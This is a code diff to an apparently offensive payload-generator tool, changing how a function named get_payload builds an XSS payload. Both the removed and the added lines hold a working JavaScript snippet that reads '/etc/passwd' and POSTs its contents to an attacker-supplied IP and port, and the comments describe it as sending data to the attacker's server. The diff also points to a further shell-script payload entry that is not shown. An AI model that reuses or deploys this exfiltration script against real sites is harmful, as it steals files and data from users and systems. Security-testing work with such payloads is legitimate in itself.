@@ -87,17 +87,15 @@ def get_payload(extension, ip, port):
                 # This uses JavaScript's `fetch` API to send document content to the attacker's server.
                 # Useful for testing XSS and data exfiltration vulnerabilities.
                 # By default attempts to get the /etc/passwd file - can be changed using nano
-                "embedded_script": (
-                    f"<script>\nfetch('/etc/passwd')\n"
-                    f"  .then(response => response.text())\n"
-                    f"  .then(data => {{\n"
-                    f"    fetch('http://{ip}:{port}/', {{\n"
-                    f"      method: 'POST',\n"
-                    f"      body: JSON.stringify({{ fileContents: data }})\n"
-                    f"    }});\n"
-                    f"  }})\n"
-                    f"  .catch(error => console.error('Error fetching /etc/passwd:', error));\n</script>"
-                )
+                f"<script>\nfetch('/etc/passwd')\n"
+                f"  .then(response => response.text())\n"
+                f"  .then(data => {{\n"
+                f"    fetch('http://{ip}:{port}/', {{\n"
+                f"      method: 'POST',\n"
+                f"      body: JSON.stringify({{ fileContents: data }})\n"
+                f"    }});\n"
+                f"  }})\n"
+                f"  .catch(error => console.error('Error fetching /etc/passwd:', error));\n</script>"
             )
         },
         ".sh": (
